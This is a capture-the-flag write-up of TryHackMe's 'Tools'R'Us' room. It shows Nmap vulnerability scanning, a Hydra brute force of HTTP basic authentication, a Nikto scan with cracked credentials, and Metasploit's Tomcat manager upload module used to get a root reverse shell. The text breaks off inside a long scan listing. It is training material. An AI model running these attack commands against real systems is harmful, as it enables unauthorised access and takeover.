http://10.10.28.154\nThis finds the following directories:\n\n/icons/\n/icons/small/\n/guidelines/\n/protected/\n/server-status/\n\nGoing to http://10.10.28.154/guidelines/ reveals a single message:\nHey &lt;b&gt;bob&lt;/b&gt;, did you update that TomCat server?\nSo, that kinda does imply that Tomcat or Coyote might be vulnerable, even though I couldn’t find anything obvious on Exploit DB. I’ll come back to that.\nWe’ll deploy Hydra against the http-basic authentication protecting /protected/. I’ve never done this before, but a quick internet search reveals a potentially useful guide, as well as an additional walk-through clarifying how to use Hydra to crack Apache conf-based http-basic authentication. With this information in hand, we should (hopefully) be able to crack Bob’s password using the following:\nhydra -l bob \\\n      -P ~/.local/share/red-team/wordlists/rockyou.txt \\\n      -f -vV http-get://10.10.28.154/protected/\nI’m kinda curious what’s in /protected/. Unfortunately, the experience is kinda anti-climatic.\n&lt;center&gt;&lt;/br&gt; &lt;img width=150 src=&quot;protected.png&quot;&gt; &lt;p&gt;This protected page has now moved to a different port.&lt;/p&gt; &lt;/center&gt;\nOh well.\nThe CTF does direct us to look at http://10.10.28.154:1234/manager/html (using Bob’s password); that’s just the Tomcat documentation by the looks of it. But if we throw Nikto against it, we can get ourselves another flag.\nnikto -Format txt \\\n      -host http://10.10.28.154:1234/manager/html \\\n      -id bob:bubbles -nossl -output tools-r-us.txt\nAt this point we’ve got all but two flags. The text for these imply that we can get RCE on this version of Tomcat. It looks like Apache Tomcat 7.0.88 was released on May 16, 2018. There’s no obvious vulnerability to exploit for this version, but after searching around a bit on the net I found a guide mentioning that RCE on Tomcat could be obtained via the “manager” application. And, indeed, looking at the info for the corresponding module in Metasploit (exploit/multi/http/tomcat_mgr_upload) reveals that we can obtain RCE if we have access to the /manager/html/upload component. Which we do, because /manager/html has the option to “Select WAR file to upload”.\nNow, exploit/multi/http/tomcat_mgr_upload only targets 32-bit Linux, and the server is running a 64-bit build (this can also be found in /manager/html/), so we’ll use the “Java Universal” target.\nuse exploit/multi/http/tomcat_mgr_upload\nset HttpPassword bubbles\nset HttpUsername bob\nset RHOSTS 10.10.28.154\nset RPORT 1234\nset LHOST 10.13.26.40\nexploit\nAnd we have a meterpreter shell! Running getuid reveals that we’re also running as root. Ouch.\nWe’ll just drop to shell in meterpreter to get the contents of /root/flag.txt.\nElapsed Time: 3 h 7 min","richContent":"&lt;blockquote class=&quot;callout note&quot; data-callout=&quot;note&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Note&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;&lt;a href=&quot;https://tryhackme.com/room/toolsrus&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;“Tools‘R’Us” on TryHackMe&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;p&gt;We’re supposed to restrict ourselves to the following tools in this CTF:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;dirbuster&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Hydra&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Hydra&quot;&gt;Hydra&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nikto&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nikto&quot;&gt;Nikto&lt;/a&gt;&lt;/li&gt;\n&lt;li&gt;Metasploit&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;It’s been a little while since I had the chance to use some of these, so let’s find out how rusty I am!&lt;/p&gt;\n&lt;h2 id=&quot;narrative&quot;&gt;Narrative&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#narrative&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;The target is at 10.10.28.154. Visiting &lt;code&gt;http://10.10.28.154&lt;/code&gt; reveals a “down for maintenance” page with no other links, but with the cryptic promise that “[o]ther parts of the website is [sic] still functional…”&lt;/p&gt;\n&lt;p&gt;We’ll start off with an &lt;a href=&quot;https://cardboard-iguana.com/grimoire/./spells/Nmap&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/Nmap&quot;&gt;Nmap&lt;/a&gt; scan.&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;sudo&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -oA&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; tools-r-us&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -Pn&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -A&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -T4&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -sS&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; vuln&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;          -p-&lt;/span&gt;&lt;span style=&quot;--shiki-light:#2F798A;--shiki-dark:#4C9A91&quot;&gt; 10.10.28.154&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;p&gt;This gives the following output:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;# Nmap 7.92 scan initiated Sun Jan 30 15:52:33 2022 as: nmap -v -oA tools-r-us -Pn -A -T4 -sS -script vuln -p- 10.10.28.154\nPre-scan script results:\n|_broadcast-avahi-dos: ERROR: Script execution failed (use -d to debug)\nNmap scan report for 10.10.28.154\nHost is up (0.17s latency).\nNot shown: 65531 closed tcp ports (reset)\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| vulners: \n|   cpe:/a:openbsd:openssh:7.2p2: \n|     \tPACKETSTORM:140070\t7.8\thttps://vulners.com/packetstorm/PACKETSTORM:140070\t*EXPLOIT*\n|     \tEXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09\t7.8\thttps://vulners.com/exploitpack/EXPLOITPACK:5BCA798C6BA71FAE29334297EC0B6A09\t*EXPLOIT*\n|     \tEDB-ID:40888\t7.8\thttps://vulners.com/exploitdb/EDB-ID:40888\t*EXPLOIT*\n|     \tCVE-2016-8858\t7.8\thttps://vulners.com/cve/CVE-2016-8858\n|     \tCVE-2016-6515\t7.8\thttps://vulners.com/cve/CVE-2016-6515\n|     \t1337DAY-ID-26494\t7.8\thttps://vulners.com/zdt/1337DAY-ID-26494\t*EXPLOIT*\n|     \tSSV:92579\t7.5\thttps://vulners.com/seebug/SSV:92579\t*EXPLOIT*\n|     \tCVE-2016-10009\t7.5\thttps://vulners.com/cve/CVE-2016-10009\n|     \t1337DAY-ID-26576\t7.5\thttps://vulners.com/zdt/1337DAY-ID-26576\t*EXPLOIT*\n|     \tSSV:92582\t7.2\thttps://vulners.com/seebug/SSV:92582\t*EXPLOIT*\n|     \tCVE-2016-10012\t7.2\thttps://vulners.com/cve/CVE-2016-10012\n|     \tCVE-2015-8325\t7.2\thttps://vulners.com/cve/CVE-2015-8325\n|     \tSSV:92580\t6.9\thttps://vulners.com/seebug/SSV:92580\t*EXPLOIT*\n|     \tCVE-2016-10010\t6.9\thttps://vulners.com/cve/CVE-2016-10010\n|     \t1337DAY-ID-26577\t6.9\thttps://vulners.com/zdt/1337DAY-ID-26577\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2019-25017/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2019-25017/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/REDHAT-OPENSHIFT-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-AIX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-AIX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/GENTOO-LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/F5-BIG-IP-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/AMAZON-LINUX-AMI-2-CVE-2019-6111/\t*EXPLOIT*\n|     \tMSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/\t5.8\thttps://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2019-6111/\t*EXPLOIT*\n|     \tEXPLOITPACK:98FE96309F9524B8C84C508837551A19\t5.8\thttps://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19\t*EXPLOIT*\n|     \tEXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97\t5.8\thttps://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97\t*EXPLOIT*\n|     \tEDB-ID:46516\t5.8\thttps://vulners.com/exploitdb/EDB-ID:46516\t*EXPLOIT*\n|     \tEDB-ID:46193\t5.8\thttps://vulners.com/exploitdb/EDB-ID:46193\t*EXPLOIT*\n|     \tCVE-2019-6111\t5.8\thttps://vulners.com/cve/CVE-2019-6111\n|     \t1337DAY-ID-32328\t5.8\thttps://vulners.com/zdt/1337DAY-ID-32328\t*EXPLOIT*\n|     \t1337DAY-ID-32009\t5.8\thttps://vulners.com/zdt/1337DAY-ID-32009\t*EXPLOIT*\n|     \tSSV:91041\t5.5\thttps://vulners.com/seebug/SSV:91041\t*EXPLOIT*\n|     \tPACKETSTORM:140019\t5.5\thttps://vulners.com/packetstorm/PACKETSTORM:140019\t*EXPLOIT*\n|     \tPACKETSTORM:136234\t5.5\thttps://vulners.com/packetstorm/PACKETSTORM:136234\t*EXPLOIT*\n|     \tEXPLOITPACK:F92411A645D85F05BDBD274FD222226F\t5.5\thttps://vulners.com/exploitpack/EXPLOITPACK:F92411A645D85F05BDBD274FD222226F\t*EXPLOIT*\n|     \tEXPLOITPACK:9F2E746846C3C623A27A441281EAD138\t5.5\thttps://vulners.com/exploitpack/EXPLOITPACK:9F2E746846C3C623A27A441281EAD138\t*EXPLOIT*\n|     \tEXPLOITPACK:1902C998CBF9154396911926B4C3B330\t5.5\thttps://vulners.com/exploitpack/EXPLOITPACK:1902C998CBF9154396911926B4C3B330\t*EXPLOIT*\n|     \tEDB-ID:40858\t5.5\thttps://vulners.com/exploitdb/EDB-ID:40858\t*EXPLOIT*\n|     \tEDB-ID:40119\t5.5\thttps://vulners.com/exploitdb/EDB-ID:40119\t*EXPLOIT*\n|     \tEDB-ID:39569\t5.5\thttps://vulners.com/exploitdb/EDB-ID:39569\t*EXPLOIT*\n|     \tCVE-2016-3115\t5.5\thttps://vulners.com/cve/CVE-2016-3115\n|     \tSSH_ENUM\t5.0\thttps://vulners.com/canvas/SSH_ENUM\t*EXPLOIT*\n|     \tPACKETSTORM:150621\t5.0\thttps://vulners.com/packetstorm/PACKETSTORM:150621\t*EXPLOIT*\n|     \tMSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS\t5.0\thttps://vulners.com/metasploit/MSF:AUXILIARY/SCANNER/SSH/SSH_ENUMUSERS\t*EXPLOIT*\n|     \tEXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0\t5.0\thttps://vulners.com/exploitpack/EXPLOITPACK:F957D7E8A0CC1E23C3C649B764E13FB0\t*EXPLOIT*\n|     \tEXPLOITPACK:EBDBC5685E3276D648B4D14B75563283\t5.0\thttps://vulners.com/exploitpack/EXPLOITPACK:EBDBC5685E3276D648B4D14B75563283\t*EXPLOIT*\n|     \tEDB-ID:45939\t5.0\thttps://vulners.com/exploitdb/EDB-ID:45939\t*EXPLOIT*\n|     \tEDB-ID:45233\t5.0\thttps://vulners.com/exploitdb/EDB-ID:45233\t*EXPLOIT*\n|     \tCVE-2018-15919\t5.0\thttps://vulners.com/cve/CVE-2018-15919\n|     \tCVE-2018-15473\t5.0\thttps://vulners.com/cve/CVE-2018-15473\n|     \tCVE-2017-15906\t5.0\thttps://vulners.com/cve/CVE-2017-15906\n|     \tCVE-2016-10708\t5.0\thttps://vulners.com/cve/CVE-2016-10708\n|     \t1337DAY-ID-31730\t5.0\thttps://vulners.com/zdt/1337DAY-ID-31730\t*EXPLOIT*\n|     \tCVE-2021-41617\t4.4\thttps://vulners.com/cve/CVE-2021-41617\n|     \tMSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/OPENBSD-OPENSSH-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP9-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP8-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP5-CVE-2020-14145/\t*EXPLOIT*\n|     \tMSF:ILITIES/F5-BIG-IP-CVE-2020-14145/\t4.3\thttps://vulners.com/metasploit/MSF:ILITIES/F5-BIG-IP-CVE-2020-14145/\t*EXPLOIT*\n|     \tEXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF\t4.3\thttps://vulners.com/exploitpack/EXPLOITPACK:802AF3229492E147A5F09C7F2B27C6DF\t*EXPLOIT*\n|     \tEXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF\t4.3\thttps://vulners.com/exploitpack/EXPLOITPACK:5652DDAA7FE452E19AC0DC1CD97BA3EF\t*EXPLOIT*\n|     \tEDB-ID:40136\t4.3\thttps://vulners.com/exploitdb/EDB-ID:40136\t*EXPLOIT*\n|     \tEDB-ID:40113\t4.3\thttps://vulners.com/exploitdb/EDB-ID:40113\t*EXPLOIT*\n|     \tCVE-2020-14145\t4.3\thttps://vulners.com/cve/CVE-2020-14145\n|     \tCVE-2016-6210\t4.3\thttps://vulners.com/cve/CVE-2016-6210\n|     \t1337DAY-ID-25440\t4.3\thttps://vulners.com/zdt/1337DAY-ID-25440\t*EXPLOIT*\n|     \t1337DAY-ID-25438\t4.3\thttps://vulners.com/zdt/1337DAY-ID-25438\t*EXPLOIT*\n|     \tCVE-2019-6110\t4.0\thttps://vulners.com/cve/CVE-2019-6110\n|     \tCVE-2019-6109\t4.0\thttps://vulners.com/cve/CVE-2019-6109\n|     \tCVE-2018-20685\t2.6\thttps://vulners.com/cve/CVE-2018-20685\n|     \tSSV:92581\t2.1\thttps://vulners.com/seebug/SSV:92581\t*EXPLOIT*\n|     \tCVE-2016-10011\t2.1\thttps://vulners.com/cve/CVE-2016-10011\n|     \tSRC-2016-0002\t0.0\thttps://vulners.com/srcincite/SRC-2016-0002\t*EXPLOIT*\n|     \tPACKETSTORM:151227\t0.0\thttps://vulners.com/packetstorm/PACKETSTORM:151227\t*EXPLOIT*\n|     \tPACKETSTORM:140261\t0.0\thttps://vulners.com/packetstorm/PACKETSTORM:140261\t*EXPLOIT*\n|     \tPACKETSTORM:138006\t0.0\thttps://vulners.com/packetstorm/PACKETSTORM:138006\t*EXPLOIT*\n|     \tPACKETSTORM:137942\t0.0\thttps://vulners.com/packetstorm/PACKETSTORM:137942\t*EXPLOIT*\n|_    \t1337DAY-ID-30937\t0.0\thttps://vulners.com/zdt/1337DAY-ID-30937\t*EXPLOIT*\n80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))\n| http-enum: \n|_  /protected/: Potentially interesting folder (401 Unauthorized)\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-stored-xss: Couldn&#039;t find any stored XSS vulnerabilities.\n|_http-csrf: Couldn&#039;t find any CSRF vulnerabilities.\n| vulners: \n|   cpe:/a:apache:http_server:2.4.18: \n|     \tCVE-2021-44790\t7.5\thttps://vulners.com/cve/CVE-2021-44790\n|     \tCVE-2021-39275\t7.5\thttps://vulners.com/cve/CVE-2021-39275\n|     \tCVE-2021-26691\t7.5\thttps://vulners.com/cve/CVE-2021-26691\n|     \tCVE-2017-7679\t7.5\thttps://vulners.com/cve/CVE-2017-7679\n|     \tCVE-2017-7668\t7.5\thttps://vulners.com/cve/CVE-2017-7668\n|     \tCVE-2017-3169\t7.5\thttps://vulners.com/cve/CVE-2017-3169\n|     \tCVE-2017-3167\t7.5\thttps://vulners.com/cve/CVE-2017-3167\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/\t7.2\thttps://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0211/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/\t7.2\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0211/\t*EXPLOIT*\n|     \tEXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB\t7.2\thttps://vulners.com/exploitpack/EXPLOITPACK:44C5118F831D55FAF4259C41D8BDA0AB\t*EXPLOIT*\n|     \tEDB-ID:46676\t7.2\thttps://vulners.com/exploitdb/EDB-ID:46676\t*EXPLOIT*\n|     \tCVE-2019-0211\t7.2\thttps://vulners.com/cve/CVE-2019-0211\n|     \t1337DAY-ID-32502\t7.2\thttps://vulners.com/zdt/1337DAY-ID-32502\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1312/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/SUSE-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/SUSE-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/ORACLE-SOLARIS-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP3-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP2-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/HUAWEI-EULEROS-2_0_SP1-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/FREEBSD-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/FREEBSD-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/DEBIAN-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/DEBIAN-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/CENTOS_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/APACHE-HTTPD-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/AMAZON_LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tMSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2018-1312/\t*EXPLOIT*\n|     \tMSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/\t6.8\thttps://vulners.com/metasploit/MSF:ILITIES/ALPINE-LINUX-CVE-2017-15715/\t*EXPLOIT*\n|     \tFDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8\t6.8\thttps://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8\t*EXPLOIT*\n|     \tCVE-2021-40438\t6.8\thttps://vulners.com/cve/CVE-2021-40438\n|     \tCVE-2020-35452\t6.8\thttps://vulners.com/cve/CVE-2020-35452\n|     \tCVE-2018-1312\t6.8\thttps://vulners.com/cve/CVE-2018-1312\n|     \tCVE-2017-15715\t6.8\thttps://vulners.com/cve/CVE-2017-15715\n|     \t4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332\t6.8\thttps://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332\t*EXPLOIT*\n|     \tCVE-2021-44224\t6.4\thttps://vulners.com/cve/CVE-2021-44224\n|     \tCVE-2019-10082\t6.4\thttps://vulners.com/cve/CVE-2019-10082\n|     \tCVE-2017-9788\t6.4\thttps://vulners.com/cve/CVE-2017-9788\n|     \tMSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/\t6.0\thttps://vulners.com/metasploit/MSF:ILITIES/REDHAT_LINUX-CVE-2019-0217/\t*EXPLOIT*\n|     \tMSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/\t6.0\thttps://vulners.com/metasploit/MSF:ILITIES/IBM-HTTP_SERVER-CVE-2019-0217/\t*EXPLOIT*\n|     \tCVE-2019-0217\t6.0\thttps://vulners.com/cve/CVE-2019-0217\n|     \tCVE-2020-1927\t5.8\thttps://vulners.com/cve/CVE-2020-1927\n|     \tCVE-2019-10098\t5.8\thttps://vulners.com/cve/CVE-2019-10098\n|     \t1337DAY-ID-33577\t5.8\thttps://vulners.com/zdt/1337DAY-ID-33577\t*EXPLOIT*\n|     \tCVE-2016-5387\t5.1\thttps://vulners.com/cve/CVE-2016-5387\n|     \tSSV:96537\t5.0\thttps://vulners.com/seebug/SSV:96537\t*EXPLOIT*\n|     \tMSF:ILITIES/UBUNTU-CVE-2018-1333/\t5.0\thttps://vulners.com/metasploit/MSF:ILITIES/UBUNTU-CVE-2018-1333/\t*EXPLOIT*\n|     